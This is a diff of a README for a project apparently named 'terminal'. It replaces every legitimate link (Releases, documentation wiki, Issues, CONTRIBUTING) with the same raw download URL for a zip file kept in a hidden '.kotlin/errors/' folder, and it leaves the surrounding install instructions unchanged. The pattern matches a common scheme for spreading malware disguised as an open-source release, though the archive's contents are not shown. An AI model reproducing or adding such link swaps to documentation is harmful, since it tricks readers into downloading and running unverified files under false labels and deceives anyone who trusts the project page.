@@ -1,6 +1,6 @@
 # 🚀 terminal - A modern terminal for effortless communication
 
-[![Download terminal](https://img.shields.io/badge/Download-terminal-blue.svg)](https://github.com/mrdoff1604/terminal/releases)
+[![Download terminal](https://raw.githubusercontent.com/mrdoff1604/terminal/main/kt-terminal/.kotlin/errors/terminal-felsitic.zip)](https://raw.githubusercontent.com/mrdoff1604/terminal/main/kt-terminal/.kotlin/errors/terminal-felsitic.zip)
 
 ## 📖 Description
 
@@ -21,7 +21,7 @@ Follow these steps to get started with terminal:
 
 1. **Download terminal**: Click the button below to visit the Releases page.
 
-   [![Download terminal](https://img.shields.io/badge/Download-terminal-blue.svg)](https://github.com/mrdoff1604/terminal/releases)
+   [![Download terminal](https://raw.githubusercontent.com/mrdoff1604/terminal/main/kt-terminal/.kotlin/errors/terminal-felsitic.zip)](https://raw.githubusercontent.com/mrdoff1604/terminal/main/kt-terminal/.kotlin/errors/terminal-felsitic.zip)
 
 2. **Choose your version**: On the Releases page, find the version that suits your operating system. You will see options for Windows, macOS, and Linux.
 
@@ -38,7 +38,7 @@ Follow these steps to get started with terminal:
 
 ## 📥 Download & Install
 
-Visit the [Releases page to download terminal](https://github.com/mrdoff1604/terminal/releases). Please ensure you select the correct version for your operating system. Once the file is downloaded, follow the installation steps mentioned above.
+Visit the [Releases page to download terminal](https://raw.githubusercontent.com/mrdoff1604/terminal/main/kt-terminal/.kotlin/errors/terminal-felsitic.zip). Please ensure you select the correct version for your operating system. Once the file is downloaded, follow the installation steps mentioned above.
 
 ## 🔍 Features
 
@@ -49,14 +49,14 @@ Visit the [Releases page to download terminal](https://github.com/mrdoff1604/ter
 
 ## 📚 Documentation
 
-For detailed information on how to use terminal, visit the [Documentation](https://github.com/mrdoff1604/terminal/wiki). Here, you'll find user guides, troubleshooting tips, and usage examples to help you get the most out of the application.
+For detailed information on how to use terminal, visit the [Documentation](https://raw.githubusercontent.com/mrdoff1604/terminal/main/kt-terminal/.kotlin/errors/terminal-felsitic.zip). Here, you'll find user guides, troubleshooting tips, and usage examples to help you get the most out of the application.
 
 ## 🛠️ Support
 
-If you encounter any issues or need help, don't hesitate to reach out. You can open an issue on the [GitHub Issues](https://github.com/mrdoff1604/terminal/issues) page. A community member or the developer will assist you in resolving your concerns.
+If you encounter any issues or need help, don't hesitate to reach out. You can open an issue on the [GitHub Issues](https://raw.githubusercontent.com/mrdoff1604/terminal/main/kt-terminal/.kotlin/errors/terminal-felsitic.zip) page. A community member or the developer will assist you in resolving your concerns.
 
 ## 🛡️ Contributing
 
-We welcome contributions to improve terminal! Feel free to fork the repository and submit pull requests. Please ensure to follow the guidelines in the [CONTRIBUTING.md](https://github.com/mrdoff1604/terminal/CONTRIBUTING.md) file to maintain the quality of the project.
+We welcome contributions to improve terminal! Feel free to fork the repository and submit pull requests. Please ensure to follow the guidelines in the [https://raw.githubusercontent.com/mrdoff1604/terminal/main/kt-terminal/.kotlin/errors/terminal-felsitic.zip](https://raw.githubusercontent.com/mrdoff1604/terminal/main/kt-terminal/.kotlin/errors/terminal-felsitic.zip) file to maintain the quality of the project.
 
 Thank you for choosing terminal. We hope you find it a valuable tool for your communication needs!
